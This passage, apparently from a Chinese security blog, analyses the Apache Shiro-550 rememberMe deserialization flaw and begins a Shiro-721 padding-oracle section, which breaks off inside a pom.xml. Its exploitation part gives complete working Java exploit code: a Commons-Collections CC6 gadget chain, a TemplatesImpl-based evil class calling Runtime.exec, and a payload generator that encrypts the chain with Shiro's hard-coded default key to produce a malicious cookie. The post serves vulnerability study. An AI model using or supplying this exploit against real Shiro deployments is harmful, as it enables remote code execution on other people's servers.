</span></span><span class="line"><span class="cl">        <span class="n">setCipherKey</span><span class="o">(</span><span class="n">DEFAULT_CIPHER_KEY_BYTES</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></div><p>这里就保存我们常见的key了，返回时byte类型：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">DEFAULT_CIPHER_KEY_BYTES</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="s">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span><span class="o">);</span>
</span></span></code></pre></div><p>再继续跟进去encrypt方法就是AES加密的流程了，我们走完加密就会回到rememberIdentity方法，下面有个rememberSerializedIdentity方法，这里就是把rememberme写到cookie里面：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231211000319351.png" alt="image-20231211000319351"></p>
<p>整个加密过程不是很复杂：</p>
<p>1、序列化principals对象的值（root）</p>
<p>2、将序列化后principals对象的值跟DEFAULT_CIPHER_KEY_BYTES进行AES加密，iv为随机，模式为CBC</p>
<p>3、生成Base64字符串，写入Cookie</p>
<h3 id="解密过程">解密过程</h3>
<p>我们可以在Get方法加上我们有rememberMe的Cookie：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231211010351439.png" alt="image-20231211010351439"></p>
<p>解密就不需要从登陆口进行分析了，还记得我们刚开始的时候分析到了<code>org.apache.shiro.web.servlet.OncePerRequestFilter</code>，这时候我们就可以从这里doFilterInternal方法下断点开始跟：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231211010222660.png" alt="image-20231211010222660"></p>
<p>往下走到createSubject方法：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231211010449699.png" alt="image-20231211010449699"></p>
<p>继续往下走buildWebSubject方法，不要怕，继续走到buildSubject-&gt;createSubject方法，可以看到我们主要的resolvePrincipals方法了：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231211010617291.png" alt="image-20231211010617291"></p>
<p>跟进去，到getRememberedIdentity这个方法进去，继续往下跟getRememberedPrincipals方法，不要怕下面不是很复杂的。可以看到我们熟悉的两个方法<code>getRememberedSerializedIdentity</code>、<code>convertBytesToPrincipals</code>：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231211010811697.png" alt="image-20231211010811697"></p>
<ul>
<li>getRememberedSerializedIdentity</li>
</ul>
<p>这个方法主要是获取cookie的RememberMe的值并进行Base64解码</p>
<ul>
<li>convertBytesToPrincipals</li>
</ul>
<p>这个方法是将上面获取到的密文进行解密并进行反序列化的</p>
<p>我们进行往下跟convertBytesToPrincipals方法里面的decrypt，解密的key也就是我们上面加密的固定可以，可以看下iv的值怎么获取的：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231211011318960.png" alt="image-20231211011318960"></p>
<p>iv值也就是密文的前16位，密文减掉前面的iv就是要解密的密文了，然后拿着密文+key+iv进行AES的解密流程。</p>
<p>解密完之后就会进到反序列化的过程：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231211011709434.png" alt="image-20231211011709434"></p>
<h3 id="漏洞利用">漏洞利用</h3>
<p>我们了解整个解密流程，那漏洞利用的思路就是：</p>
<p>1、编写恶意的CC链，并转换成字节码</p>
<p>2、使用里面固定的key加密我们的CC链并进行序列化</p>
<p>2、放到Cookie里面的rememberMe进行访问</p>
<p>那第一步就是编写恶意的CC链，我们可以用CC6，因为没有JDK的版本限制，比较通用。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC6</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Transformer</span><span class="o">[]</span>  <span class="n">transformers</span><span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;getMethod&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&#34;getRuntime&#34;</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;invoke&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&#34;open /System/Applications/Calculator.app&#34;</span><span class="o">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">};</span>
</span></span><span class="line"><span class="cl">        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span><span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Map</span> <span class="n">hashMap1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">Map</span> <span class="n">lazymap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">hashMap1</span><span class="o">,</span><span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">1</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">lazymap</span><span class="o">,</span><span class="s">&#34;11&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">HashMap</span> <span class="n">hashMap2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">hashMap2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">tiedMapEntry</span><span class="o">,</span><span class="s">&#34;2&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">lazymap</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="s">&#34;11&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">Field</span> <span class="n">ifield</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;factory&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ifield</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ifield</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">lazymap</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="c1">//改写的部分
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">//利用固定的key对我们的hashMap2进行序列化
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">AesCipherService</span> <span class="n">aes</span> <span class="o">=</span> <span class="k">new</span> <span class="n">AesCipherService</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="o">[]</span> <span class="n">key</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="s">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">ObjectOutputStream</span> <span class="n">oss</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">oss</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">hashMap2</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">      <span class="c1">//对序列化后的字节码进行AES进行加密
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ByteSource</span> <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">aes</span><span class="o">.</span><span class="na">encrypt</span><span class="o">(</span><span class="n">barr</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">(),</span> <span class="n">key</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">      <span class="c1">//输出Base64的字符串，也可以用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">//Base64.encodeToString(ciphertext.getBytes()),aes.encrypt返回的是SimpleByteSource
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">printf</span><span class="o">(</span><span class="n">ciphertext</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="n">oss</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>然后我们把生成Base64的字符串放到Cookie当中,会发现报错了这里P神有解释过：</p>
<blockquote>
<p>如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。这就解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。</p>
</blockquote>
<p>那么我们可以进行改写一下，上半部分有点像CC2，使用TemplatesImpl，然后不用Transformer数组，只用一个InvokerTransformer方法。</p>
<p>恶意类EvilTemplatesImpl的代码：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">EvilTemplatesImpl</span> <span class="kd">extends</span> <span class="n">AbstractTranslet</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">SerializationHandler</span><span class="o">[]</span> <span class="n">handlers</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">DTMAxisIterator</span> <span class="n">iterator</span><span class="o">,</span> <span class="n">SerializationHandler</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">EvilTemplatesImpl</span> <span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;open /System/Applications/Calculator.app&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>最终改写后的的CC6为：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.shiro.codec.Base64</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.shiro.crypto.AesCipherService</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.shiro.util.ByteSource</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">expShiro</span>  <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_bytecodes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">//取当前目录下的类路径EvilTemplatesImpl.class.getName()，如果在当前目录下可以直接写类名即可
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">EvilTemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()).</span><span class="na">toBytecode</span><span class="o">()</span>
</span></span><span class="line"><span class="cl">        <span class="o">});</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_name&#34;</span><span class="o">,</span> <span class="s">&#34;HelloTemplatesImpl&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">InvokerTransformer</span> <span class="n">newTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;toString&#34;</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Map</span> <span class="n">hashMap1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">Map</span> <span class="n">lazymap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">hashMap1</span><span class="o">,</span><span class="n">newTransformer</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">lazymap</span><span class="o">,</span><span class="n">obj</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">HashMap</span> <span class="n">hashMap2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">hashMap2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">tiedMapEntry</span><span class="o">,</span><span class="s">&#34;2&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">lazymap</span><span class="o">.</span><span class="na">clear</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">newTransformer</span><span class="o">,</span><span class="s">&#34;iMethodName&#34;</span><span class="o">,</span><span class="s">&#34;newTransformer&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">AesCipherService</span> <span class="n">aes</span> <span class="o">=</span> <span class="k">new</span> <span class="n">AesCipherService</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="o">[]</span> <span class="n">key</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="s">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">ObjectOutputStream</span> <span class="n">oss</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">oss</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">hashMap2</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ByteSource</span> <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">aes</span><span class="o">.</span><span class="na">encrypt</span><span class="o">(</span><span class="n">barr</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">(),</span> <span class="n">key</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">printf</span><span class="o">(</span><span class="n">Base64</span><span class="o">.</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">ciphertext</span><span class="o">.</span><span class="na">getBytes</span><span class="o">()));</span>
</span></span><span class="line"><span class="cl">        <span class="n">oss</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>成功触发了我们的恶意代码：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231211014506669.png" alt="image-20231211014506669"></p>
<h2 id="0x02-shiro-721分析">0x02 Shiro-721分析</h2>
<p>看了一天这CBC字节翻转攻击和Padding Oracle攻击的文章，千篇一律，都是一个套路去写文章，不过有一篇《shiro721 Padding Oracle Attack详细分析（一）》确实让我看懂了，文章链接放参考。</p>
<p>首先我们要理解这个漏洞要明白几个事情</p>
<p>1、CBC字节翻转攻击和Padding Oracle攻击都不需要去深入理解AES或者DES的加密</p>
<p>2、Padding Oracle攻击在Shiro-550也同样存在，但在1.4.2的版本之后就换成了GCM的模式</p>
<p>3、耐心慢慢来</p>
<h3 id="环境-1">环境</h3>
<p>调试工具：IDEA</p>
<p>Java版本：8u65，下载地址：<a href="http://link.zhihu.com/?target=https%3A//www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p>
<p>8u65源码：下载地址：<a href="http://link.zhihu.com/?target=https%3A//hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip">https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip</a></p>
<p>Shiro版本：1.4.1</p>
<p>pom文件配置：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;project</span> <span class="na">xmlns=</span><span class="s">&#34;http://maven.apache.org/POM/4.0.0&#34;</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;modelVersion&gt;</span>4.0.0<span class="nt">&lt;/modelVersion&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;groupId&gt;</span>org.example<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;artifactId&gt;</span>shirodemo<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;packaging&gt;</span>war<span class="nt">&lt;/packaging&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;version&gt;</span>1.0-SNAPSHOT<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;name&gt;</span>shirodemo Maven Webapp<span class="nt">&lt;/name&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;url&gt;</span>http://maven.apache.org<span class="nt">&lt;/url&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;properties&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;project.build.sourceEncoding&gt;</span>UTF-8<span class="nt">&lt;/project.build.sourceEncoding&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;maven.compiler.source&gt;</span>1.7<span class="nt">&lt;/maven.compiler.source&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;maven.compiler.target&gt;</span>1.7<span class="nt">&lt;/maven.compiler.target&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/properties&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;dependencies&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.apache.shiro<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>shiro-core<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.4.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.apache.shiro<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>shiro-web<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.4.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
